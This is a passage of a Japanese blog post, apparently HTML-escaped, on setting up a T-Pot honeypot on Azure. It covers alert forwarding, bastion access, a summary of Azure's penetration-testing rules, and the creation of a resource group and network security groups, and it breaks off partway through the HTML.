&lt;h3 id=&quot;ホストの稼働状況について監視と通知のシステムを構築する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%9B%E3%82%B9%E3%83%88%E3%81%AE%E7%A8%BC%E5%83%8D%E7%8A%B6%E6%B3%81%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E7%9B%A3%E8%A6%96%E3%81%A8%E9%80%9A%E7%9F%A5%E3%81%AE%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B&quot; aria-label=&quot;ホストの稼働状況について監視と通知のシステムを構築する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ホストの稼働状況について監視と通知のシステムを構築する&lt;/h3&gt;
&lt;p&gt;ホストの稼働状況について監視と稼働をちゃんとやっていこうと思います。&lt;/p&gt;
&lt;p&gt;各種ログやイベントをSlackかDiscordに転送します。&lt;/p&gt;
&lt;p&gt;また、コスト面については、SMSとメール通知を実施しています。&lt;/p&gt;
&lt;p&gt;コストのアラート設定については以下の記事でまとめました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/azure-setup-on-money&quot;&gt;Azure Active Directory の ID セキュリティスコアを確認してみる&lt;/a&gt;&lt;/p&gt;
&lt;!-- ### アウトバウンド通信の制御

もし万が一ハニーポットのホストがBOT化されてしまった場合のために、セキュリティグループでアウトバウンド通信を制御しておこうと思います。

なお、恐らくすべてのアウトバウンド通信をブロックするとハンドシェイクもできなくなるので、0-1023までの範囲のポートへのアウトバウンド通信のみを制御ます。

これならもし何か問題が起きた場合でも、他のサービスに対してハニーポットマシン側から自発的に攻撃を仕掛けるリスクは最小化できるかと思います。

なお、後述する Cloud One の管理マネージャとの接続やSyslogの転送など、必要なアウトバウンド通信は明示的に許可しておく必要があります。 --&gt;
&lt;h3 id=&quot;ハニーポットへの接続にはazureで構築した踏み台のマシンを使う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%81%B8%E3%81%AE%E6%8E%A5%E7%B6%9A%E3%81%AB%E3%81%AFazure%E3%81%A7%E6%A7%8B%E7%AF%89%E3%81%97%E3%81%9F%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%81%AE%E3%83%9E%E3%82%B7%E3%83%B3%E3%82%92%E4%BD%BF%E3%81%86&quot; aria-label=&quot;ハニーポットへの接続にはazureで構築した踏み台のマシンを使う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ハニーポットへの接続にはAzureで構築した踏み台のマシンを使う&lt;/h3&gt;
&lt;p&gt;一応今回はマルウェアは収集しない予定ですのでそこまでリスクはないかと思いますが、うっかり自分の環境にハニーポット上の悪いものを落としてこないように、ハニーポットへの接続は踏み台経由になるようにしておきます。&lt;/p&gt;
&lt;h3 id=&quot;踏み台サーバに関する追記&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%B8%8F%E3%81%BF%E5%8F%B0%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E8%BF%BD%E8%A8%98&quot; aria-label=&quot;踏み台サーバに関する追記 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;踏み台サーバに関する追記&lt;/h3&gt;
&lt;p&gt;踏み台サーバ経由のアクセスのために踏み台用の仮想マシンを作成してSSHポートフォワーディングでアクセスさせたものの、非常に通信が不安定になりました。&lt;/p&gt;
&lt;p&gt;恐らく踏み台マシンが1vCPU / 1 RAMのスペックであるせいかとは思うのですが、踏み台サーバのスペックを上げるのはコスト的に厳しいこともあり、最終的にプライベートマシン上に建てた仮想マシンからT-Potマシンにアクセスさせることにしました。&lt;/p&gt;
&lt;p&gt;Azure上の踏み台サーバは、Sentinel Agentを動かすSyslogサーバ兼、ハニーポットの監視ツールや通知プログラムを動かす用途に使おうと思います。&lt;/p&gt;
&lt;p&gt;なお、T-Potコンソールへのアクセスは、自宅のグローバルIPアドレスで絞りました。&lt;/p&gt;
&lt;h2 id=&quot;azureの規約を守る&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#azure%E3%81%AE%E8%A6%8F%E7%B4%84%E3%82%92%E5%AE%88%E3%82%8B&quot; aria-label=&quot;azureの規約を守る permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Azureの規約を守る&lt;/h2&gt;
&lt;p&gt;今回はAzureにハニーポットを建てるので規約を確認しておきました。&lt;/p&gt;
&lt;p&gt;AzureのQ&amp;#x26;Aサイトを見ると、特にハニーポットの運用は禁止されていないようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/answers/questions/318375/deployed-tpot-on-azure-vm.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Deployed tpot on azure VM - Microsoft Q&amp;#x26;A&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://blackle0pard.net/wxn7jq/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ハニーポットの運用が規約違反でないか調べてみた#2 - くろひょうのぶろぐ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ただし、以下の行為は禁止されているため、これらに該当しないように注意する必要があります。&lt;/p&gt;
&lt;p&gt;いずれの場合も、影響範囲が自分の環境のみであれば問題なく、他のユーザやAzureそのものへの攻撃がNGになるようです。&lt;/p&gt;
&lt;h3 id=&quot;禁止事項&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E7%A6%81%E6%AD%A2%E4%BA%8B%E9%A0%85&quot; aria-label=&quot;禁止事項 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;禁止事項&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;他のマイクロソフトクラウドのお客様が所有する資産をスキャンまたはテストすること。&lt;/li&gt;
&lt;li&gt;完全に自分自身のものではないデータにアクセスすること。&lt;/li&gt;
&lt;li&gt;あらゆる種類のサービス拒否のテストを実行すること。&lt;/li&gt;
&lt;li&gt;お客様の Azure 仮想マシン以外の資産に対して、ネットワーク集約的なファジングを実行すること。&lt;/li&gt;
&lt;li&gt;大量のトラフィックを発生させるサービスの自動テストを実施すること。&lt;/li&gt;
&lt;li&gt;他のお客様のデータへ故意にアクセスすること。&lt;/li&gt;
&lt;li&gt;インフラストラクチャの実行問題に対する「概念実証」以上の再現手順を実施すること。
（例：SQLiでシステム管理者アクセス権があることを証明することは許容されるが、xp_cmdshellを実行することは許されない）&lt;/li&gt;
&lt;li&gt;Microsoft Online Service Terms に規定されている Acceptable Use Policy に違反する方法で弊社のサービスを使用すること。&lt;/li&gt;
&lt;li&gt;当社の従業員に対してフィッシングやその他のソーシャルエンジニアリング攻撃を試みること。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;許可されていること&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%A8%B1%E5%8F%AF%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%81%93%E3%81%A8&quot; aria-label=&quot;許可されていること permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;許可されていること&lt;/h3&gt;
&lt;p&gt;逆に、以下の行為は許可されているようです。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;アカウント間またはテナント間のデータ アクセスを実演および証明するために、少数のテストアカウントおよび/またはトライアルテナントを作成すること。
※ ただし、これらのアカウントの1つを使用して、他のお客様やアカウントのデータにアクセスすることは禁止されています。&lt;/li&gt;
&lt;li&gt;お客様自身のAzure仮想マシンに対して、ファジング、ポートスキャン、または脆弱性評価ツールを実行する。&lt;/li&gt;
&lt;li&gt;通常の業務で発生することが予想されるトラフィックを生成して、お客様のアプリケーションを負荷テストすること。これには、サージキャパシティのテストも含まれます。&lt;/li&gt;
&lt;li&gt;セキュリティ監視と検出のテストの実施。（例：異常なセキュリティログの生成、EICARのドロップなど）&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Azure Websites や Azure Functions などの共有サービスコンテナからの脱却を試みる。&lt;/p&gt;
&lt;p&gt;ただし、成功した場合は、直ちにマイクロソフトに報告し、深掘りを中止する必要があります。他のお客様のデータに故意にアクセスすることは、規約違反となります。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Microsoft Intune 内で条件付きアクセスまたはモバイルアプリケーション管理 (MAM) ポリシーを適用し、これらのポリシーによって強制される制限の実施をテストすること。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;azureに仮想マシンを構築する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#azure%E3%81%AB%E4%BB%AE%E6%83%B3%E3%83%9E%E3%82%B7%E3%83%B3%E3%82%92%E6%A7%8B%E7%AF%89%E3%81%99%E3%82%8B&quot; aria-label=&quot;azureに仮想マシンを構築する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Azureに仮想マシンを構築する&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/telekom-security/tpotce&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;T-Pot&lt;/a&gt;のシステム要件は以下です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RAM 8GB&lt;/li&gt;
&lt;li&gt;SSD 128GB&lt;/li&gt;
&lt;li&gt;Network via DHCP&lt;/li&gt;
&lt;li&gt;インターネットアクセス環境(プロキシ無し)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上記を満たすように、Debian 10 (Buster) のマシンを作成します。&lt;/p&gt;
&lt;p&gt;仮想マシン作成のために、以下のリソースを先に作成することにします。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ハニーポット環境用のリソースグループ&lt;/li&gt;
&lt;li&gt;ハニーポットマシンに適用するセキュリティグループ&lt;/li&gt;
&lt;li&gt;ハニーポットマシンの仮想ネットワーク&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;ハニーポット環境用のリソースグループの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E7%92%B0%E5%A2%83%E7%94%A8%E3%81%AE%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;ハニーポット環境用のリソースグループの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ハニーポット環境用のリソースグループの作成&lt;/h3&gt;
&lt;p&gt;リソースグループを設定することで、複数のリソースをまとめて管理することができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/azure-resource-manager/management/manage-resource-groups-portal&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;リソース グループの管理 - Azure portal - Azure Resource Manager | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回は以下のようなリソースグループを作成し、タグの設定も行いました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/3534bac660d0649f6f4767c34aff2da0/0b533/image-17.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 73.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACTUlEQVQ4y51TTW/VMBDM3+8HgkP/CJeeOHEBtaByKRIVBdT3eG0+7SS2YydOhlm3qRr1hqVVnLU9np0dZ3k3oFAdilpB24AxzgAW/O/Iis5gv7vD4fAX0xiwLI9gMUZMDO95ycT5NGEcx5Sb+B/nOe1JMS9pfWYuK4sCdV3BDw7WGPR9x4UFPoyJpx8GBJJmCsF7GGvRW5fWB8cz/HdhQtd1CCEg298/oCpydK2GswaGgPv9Ht+vr3Hz8xY/fu9wT/aSK8vyubQwxgT0quTOeDRNnW5ax8XFBY6PjnB8coI3b9/h7OwMp6enOD8/f97TGoeS2ssQmdbIrBmok4RPicim/Lq9xYePn/D58iuurq5SfLm8xG63ewRIGk9JplXzZ4bDYBM7AZQxUgelNCo7oaIDTIibAyL8/MRmZfcylxljNwdE2KqqYZxHT6G11jwQuXm100tGW3YJULEZwnC9UQDrpkFHjQy77rgmthDNNCPEBWYInA9wfkLvIxpar3ePFWaKLNZyV8CGgC2Z1XUNsVVJxneHBxQNc7rFIS9TQ6TLhoAyl5yjjTLdueS1DaBSaFtFOxXJRq1WyB/uk4lD8MmPcRq3UjEn5s6aRnEybgC1apDz1qqTEoGBERdsNJQqhJE0ROQSjyaGStdk06bbZUEAFTcb6mPGmWXF1GmR5f2fATelgyrzBCBRsAoBknV5mllvGz45m4DkNklKya+6SN99K9kw9/p1zE/vOjUlZ3maAHKbMBRAxdzLFyBjIANLR7Tc2/d9ervyXWMF/AdiioXttqttPQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/3534bac660d0649f6f4767c34aff2da0/8ac56/image-17.webp 240w,
/static/3534bac660d0649f6f4767c34aff2da0/d3be9/image-17.webp 480w,
/static/3534bac660d0649f6f4767c34aff2da0/b0a15/image-17.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/3534bac660d0649f6f4767c34aff2da0/8ff5a/image-17.png 240w,
/static/3534bac660d0649f6f4767c34aff2da0/e85cb/image-17.png 480w,
/static/3534bac660d0649f6f4767c34aff2da0/0b533/image-17.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/3534bac660d0649f6f4767c34aff2da0/0b533/image-17.png&quot;
            alt=&quot;image-17.png&quot;
            title=&quot;image-17.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;ハニーポットマシンに適用するセキュリティグループの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%83%9E%E3%82%B7%E3%83%B3%E3%81%AB%E9%81%A9%E7%94%A8%E3%81%99%E3%82%8B%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%82%B0%E3%83%AB%E3%83%BC%E3%83%97%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;ハニーポットマシンに適用するセキュリティグループの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ハニーポットマシンに適用するセキュリティグループの作成&lt;/h3&gt;
&lt;p&gt;ネットワークセキュリティグループは、Azureのリソースが送受信するネットワークトラフィックに対するフィルタです。&lt;/p&gt;
&lt;p&gt;仮想マシンのネットワークインターフェースや、サブネットに対して関連づけることでフィルタを適用できます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/virtual-network/network-security-groups-overview&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Azure ネットワーク セキュリティ グループの概要 | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/azure/virtual-network/network-security-group-how-it-works&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ネットワーク セキュリティ グループ - しくみ | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/80e75d1c4ca09a72e899cb8d9f300005/0b533/image-18-164640095564925.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 48.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAARlAAAEZQAGA43XUAAABmElEQVQoz1VS247VMAzs18O+LULs9yCEtPwH22VL77m1aS4dPF56OESyHMfJeDxO89K+4udrh64fMAwDjiOh1oqcs1opVazgPM+b3a/7s1Iyml/9hH4NWF1AjBE2bNhTwbZHjXM9se+7FuFDehagcX+twnu5olnnEWctsGYVM4jC8G2ywnhE8A7ruiKlpI8IYK3VQs453R/HoXkWI2jDBJf3HqsApnLi67fv+PDxAZ+/POHT4yN+PD/ftVj/b5ksbzIIoBEQ0g8COBupKq0759ENMxaJjcSz8XBbxGw9tphh/A6/H1hskDhpbPyGKsDNNE5KO4h2yzJjmkZ4YZ1z0orUMpd37+VOyqJvPNQ7HyRXESRHI9GGYFfLIQTVg9MlS8ZXXj0nKi2yGxaMUYYlgFsUqVLUe82lCQGpJ0E4Ve7pCcTKHMQ13W3btDDPqF70Fun4C8h/dmMoRgAyJJh+G9lzXZPmNP+xjhrvSSQq7/km3bW8LAs4JH6Vtm3RdR3GcdTvwU/P83me9Yz3+v43DHNvLUbJB2H+B0NGBlfJzAH0AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/80e75d1c4ca09a72e899cb8d9f300005/8ac56/image-18-164640095564925.webp 240w,
/static/80e75d1c4ca09a72e899cb8d9f300005/d3be9/image-18-164640095564925.webp 480w,
/static/80e75d1c4ca09a72e899cb8d9f300005/b0a15/image-18-164640095564925.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/80e75d1c4ca09a72e899cb8d9f300005/8ff5a/image-18-164640095564925.png 240w,
/static/80e75d1c4ca09a72e899cb8d9f300005/e85cb/image-18-164640095564925.png 480w,
/static/80e75d1c4ca09a72e899cb8d9f300005/0b533/image-18-164640095564925.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/80e75d1c4ca09a72e899cb8d9f300005/0b533/image-18-164640095564925.png&quot;
            alt=&quot;image-18.png&quot;
            title=&quot;image-18.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここでは、以下の2種類のセキュリティグループを作成しました。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ハニーポットマシンに適用するセキュリティグループ&lt;/li&gt;
&lt;li&gt;ハニーポットマシンに接続する踏み台サーバ用のセキュリティグループ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;踏み台サーバのセキュリティグループは、自分のプライベートマシンからのSSHポートおよびHTTPSポートへのインバウンド接続と、すべてのアウトバウンド通信を許可します。&lt;/p&gt;
&lt;p&gt;※ SSHポートについては念のため22ポートではなくランダムなポートにしておきます。&lt;/p&gt;
&lt;p&gt;ちなみにセキュリティグループは「既定の規則」でVirtualNetworkからのすべてのインバウンド通信が許可されているガバガバ設計なので、ここで明示的にすべてのVirtualNetworkからのインバウンド通信を拒否する設定をいれています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/781f6e35708cafa7ce7d8dd38867b910/0b533/image-24.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
